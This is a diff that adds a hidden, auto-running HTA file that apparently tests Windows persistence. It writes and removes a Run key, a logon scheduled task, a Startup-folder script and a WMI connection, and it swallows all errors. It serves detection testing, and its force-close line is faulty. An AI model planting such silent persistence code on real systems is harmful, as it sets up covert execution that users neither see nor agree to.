@@ -1,0 +1,96 @@
+<html>
+<head>
+    <title>HTA Persistence & Silent Execution Test</title>
+    <HTA:APPLICATION
+        ID="htaPersistenceTest"
+        APPLICATIONNAME="HTA Persistence Test"
+        VERSION="1.0"
+        BORDER="none"
+        CAPTION="no"
+        CONTEXTMENU="no"
+        NAVIGABLE="no"
+        SCROLL="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize"
+    />
+    <style>
+        body { display: none; }
+    </style>
+</head>
+<body>
+    <script>
+        // Silent persistence test - no UI
+        function testPersistence() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+
+                // Test 1: Registry Run key modification
+                try {
+                    var runKey = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
+                    shell.RegWrite(runKey + "HTAPersistenceTest", "mshta.exe C:\\Windows\\Temp\\test.hta", "REG_SZ");
+
+                    // Verify write
+                    var value = shell.RegRead(runKey + "HTAPersistenceTest");
+
+                    // Cleanup
+                    shell.RegDelete(runKey + "HTAPersistenceTest");
+                } catch(e) { }
+
+                // Test 2: Scheduled task creation
+                try {
+                    var taskName = "HTAPersistenceTest";
+                    var taskCmd = 'powershell -Command "' +
+                        'try {' +
+                        '$task = Get-ScheduledTask -TaskName \'' + taskName + '\' -ErrorAction SilentlyContinue;' +
+                        'if ($null -eq $task) {' +
+                        'Register-ScheduledTask -TaskName \'' + taskName + '\' -Action (New-ScheduledTaskAction -Execute \'cmd.exe\') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force' +
+                        '} ' +
+                        'Unregister-ScheduledTask -TaskName \'' + taskName + '\' -Confirm:$false' +
+                        '} catch { }' +
+                        '"';
+
+                    shell.Run(taskCmd, 0, false);
+                } catch(e) { }
+
+                // Test 3: Startup folder
+                try {
+                    var startupPath = shell.SpecialFolders("StartUp");
+                    var testFile = fso.BuildPath(startupPath, "test_" + Date.now() + ".vbs");
+
+                    // Create test file
+                    var file = fso.CreateTextFile(testFile);
+                    file.WriteLine("' Test file");
+                    file.Close();
+
+                    // Delete test file
+                    fso.DeleteFile(testFile);
+                } catch(e) { }
+
+                // Test 4: WMI event subscription (advanced persistence)
+                try {
+                    var locator = new ActiveXObject("WbemScripting.SWbemLocator");
+                    var service = locator.ConnectServer(".", "root\\cimv2");
+                    // WMI operations would be performed here
+                } catch(e) { }
+
+            } catch(e) { }
+
+            // Close silently
+            try {
+                window.close();
+            } catch(e) { }
+
+            // Force close
+            try {
+                shell.Run("taskkill.exe /PID " + WScript.CreateObject("WScript.Shell").Exec("powershell -Command \"$PID\"").StdOut.ReadAll(), 0, false);
+            } catch(e) { }
+        }
+
+        // Auto-execute on load
+        testPersistence();
+    </script>
+</body>
+</html>
